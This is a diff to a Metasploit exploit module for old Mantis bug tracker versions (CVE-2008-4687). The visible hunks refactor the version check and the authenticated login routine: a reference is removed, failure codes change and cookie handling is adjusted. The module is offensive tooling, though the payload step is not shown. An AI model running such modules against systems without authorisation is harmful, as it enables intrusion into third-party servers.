@@ -24,7 +24,6 @@ class MetasploitModule < Msf::Exploit::Remote
       'References'     =>
         [
           ['EDB', '6768'],
-          ['URL', 'https://www.exploit-db.com/exploits/6768/'],
           ['CVE', '2008-4687'],
         ],
        'Privileged' => false,
@@ -64,7 +63,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     version = Gem::Version.new(Regexp.last_match[1])
 
-    vprint_status("Mantis version #{version.to_s} detected")
+    vprint_status("Mantis version #{version} detected")
 
     if res.code == 200 && version <= Gem::Version.new('1.1.3')
       return CheckCode::Appears
@@ -80,23 +79,21 @@ class MetasploitModule < Msf::Exploit::Remote
         'uri'      => normalize_uri(target_uri.path, 'login_page.php'),
     })
     unless res
-      fail_with(Failure::Unknown, 'Cannot access host to log in!')
+      fail_with(Failure::Unreachable, 'Cannot access host to log in!')
     end
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'login.php'),
       'method'    => 'POST',
       'vars_post' => {
         'username': datastore['username'],
-        'password': datastore['password']
+        'password': datastore['password'],
       },
-      'headers' => {
-        'Cookie': "PHPSESSID=#{res.get_cookies}"
-      }
+      'cookie'=> "PHPSESSID=#{res.get_cookies}"
     })
     unless res
       fail_with(Failure::Unknown, 'Cannot access host to log in!')
     end
-    fail_with(Failure::NoAccess, 'Login failed!') unless res.code == 302
+    fail_with(Failure::Unreachable, 'Login failed!') unless res.code == 302
     fail_with(Failure::NoAccess, 'Wrong credentials!') if res.redirection.to_s.include?('login_page.php')
     res.get_cookies
   end
